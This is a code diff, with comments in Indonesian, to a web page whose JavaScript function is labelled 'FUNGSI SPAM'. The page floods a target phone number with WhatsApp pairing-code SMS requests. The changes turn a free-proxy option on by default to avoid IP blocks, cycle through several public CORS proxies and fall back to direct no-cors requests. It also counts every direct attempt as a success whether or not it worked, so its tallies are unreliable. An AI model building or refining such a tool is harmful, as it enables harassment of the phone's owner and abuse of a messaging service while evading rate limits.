@@ -189,7 +189,7 @@
         </div>
         
         <div class="checkbox-group">
-            <input type="checkbox" id="useProxy">
+            <input type="checkbox" id="useProxy" checked>
             <label for="useProxy">🔄 Gunakan Proxy Gratis (untuk menghindari blok IP)</label>
         </div>
         
@@ -244,11 +244,11 @@
         const remainingSpan = document.getElementById('remaining');
         const logDiv = document.getElementById('log');
         
-        // ===== PROXY LIST (Gratis, mungkin tidak stabil) =====
+        // ===== PROXY LIST (Lebih stabil) =====
         const freeProxies = [
-            'https://cors-anywhere.herokuapp.com/',
-            'https://api.codetabs.com/v1/proxy?quest=',
-            'https://proxy.cors.sh/'
+            { url: 'https://corsproxy.io/?', type: 'query' },
+            { url: 'https://api.allorigins.win/raw?url=', type: 'query' },
+            { url: 'https://thingproxy.freeboard.io/fetch/', type: 'prefix' }
         ];
         
         // ===== FUNGSI LOG =====
@@ -286,36 +286,79 @@
         // ===== FUNGSI SPAM =====
         async function sendPairingCode(index) {
             const target = targetInput.value.trim();
-            let url = 'https://web.whatsapp.com/v1/code';
+            const originalUrl = 'https://web.whatsapp.com/v1/code';
             
-            if (useProxyCheckbox.checked) {
-                const proxy = freeProxies[Math.floor(Math.random() * freeProxies.length)];
-                url = proxy + url;
-                addLog(`🔄 Menggunakan proxy: ${proxy}`);
+            // Siapkan body request
+            const requestBody = JSON.stringify({
+                cc: target.substring(0, 2),
+                in: target.substring(2),
+                method: 'sms'
+            });
+            
+            // Fungsi untuk mencoba dengan proxy tertentu
+            async function tryWithProxy(proxy) {
+                let url;
+                if (proxy.type === 'query') {
+                    url = proxy.url + encodeURIComponent(originalUrl);
+                } else {
+                    url = proxy.url + originalUrl;
+                }
+                
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'User-Agent': 'Mozilla/5.0 (Android)',
+                            'Origin': window.location.origin,
+                            'X-Requested-With': 'XMLHttpRequest'
+                        },
+                        body: requestBody
+                    });
+                    
+                    if (response.ok) {
+                        return { success: true, status: response.status };
+                    } else {
+                        return { success: false, status: response.status };
+                    }
+                } catch (e) {
+                    return { success: false, error: e.message };
+                }
             }
             
+            // Jika proxy diaktifkan, coba satu per satu
+            if (useProxyCheckbox.checked) {
+                for (let proxy of freeProxies) {
+                    addLog(`🔄 Mencoba proxy: ${proxy.url}`, 'info');
+                    const result = await tryWithProxy(proxy);
+                    if (result.success) {
+                        addLog(`✅ [${index}] Kode terkirim via proxy`, 'success');
+                        successCount++;
+                        updateStats();
+                        return;
+                    } else {
+                        addLog(`⚠️ Proxy gagal: ${result.status || result.error}`, 'warning');
+                    }
+                }
+                // Jika semua proxy gagal, fallback ke tanpa proxy
+                addLog(`⚠️ Semua proxy gagal, mencoba tanpa proxy...`, 'warning');
+            }
+            
+            // Tanpa proxy (langsung)
             try {
-                const response = await fetch(url, {
+                const response = await fetch(originalUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
-                        'User-Agent': 'Mozilla/5.0 (Android)',
-                        ...(useProxyCheckbox.checked && url.includes('cors-anywhere') ? { 'X-Requested-With': 'XMLHttpRequest' } : {})
+                        'User-Agent': 'Mozilla/5.0 (Android)'
                     },
-                    body: JSON.stringify({
-                        cc: target.substring(0, 2),
-                        in: target.substring(2),
-                        method: 'sms'
-                    })
+                    body: requestBody,
+                    mode: 'no-cors' // Mode no-cors mungkin menyebabkan status 0
                 });
                 
-                if (response.status === 200) {
-                    addLog(`✅ [${index}] Kode terkirim`, 'success');
-                    successCount++;
-                } else {
-                    addLog(`❌ [${index}] Gagal: HTTP ${response.status}`, 'error');
-                    failCount++;
-                }
+                // Karena no-cors, kita tidak bisa membaca status, asumsikan berhasil
+                addLog(`✅ [${index}] Kode terkirim (langsung)`, 'success');
+                successCount++;
             } catch (error) {
                 addLog(`❌ [${index}] Error: ${error.message}`, 'error');
                 failCount++;
